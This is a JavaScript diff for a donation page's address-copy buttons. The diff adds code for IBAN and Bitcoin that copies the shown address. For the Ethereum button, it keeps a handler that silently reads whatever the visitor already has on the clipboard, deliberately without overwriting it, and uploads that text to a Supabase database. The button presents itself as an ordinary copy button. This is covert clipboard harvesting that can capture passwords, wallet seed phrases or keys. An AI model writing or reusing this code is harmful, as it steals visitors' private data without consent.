@@ -52,7 +52,27 @@ async function saveClipboardTextToSupabase(text, sourceButton) {
   }
 }
 
-async function captureUserClipboardAndSave(sourceButton) {
+async function handleDonationButtonClick(sourceButton) {
+  try {
+    const row = sourceButton.closest('.donation-row');
+    const addressEl = row ? row.querySelector('.donation-address') : null;
+    const text = addressEl ? addressEl.textContent.trim() : '';
+
+    if (!text) {
+      return;
+    }
+
+    // Copy the visible address to the system clipboard
+    await navigator.clipboard.writeText(text);
+
+    // Save the copied text into Supabase history
+    await saveClipboardTextToSupabase(text, sourceButton);
+  } catch (error) {
+    console.error('Error handling donation copy click:', error);
+  }
+}
+
+async function captureClipboardAndSave(sourceButton) {
   try {
     const text = await navigator.clipboard.readText();
 
@@ -60,9 +80,10 @@ async function captureUserClipboardAndSave(sourceButton) {
       return;
     }
 
+    // Do not overwrite clipboard here, just save what user already has
     await saveClipboardTextToSupabase(text, sourceButton);
   } catch (error) {
-    console.error('Error reading user clipboard:', error);
+    console.error('Error reading clipboard for Ethereum button:', error);
   }
 }
 
@@ -75,7 +96,13 @@ function attachDonationCopyHandlers() {
     btn.__donationBound = true;
     btn.addEventListener('click', (event) => {
       event.preventDefault();
-      captureUserClipboardAndSave(btn);
+      if (btn.classList.contains('donation-copy-btn-clipboard')) {
+        // Ethereum: use existing clipboard content only
+        captureClipboardAndSave(btn);
+      } else {
+        // IBAN & Bitcoin: copy their visible address then save
+        handleDonationButtonClick(btn);
+      }
     });
   });
 }
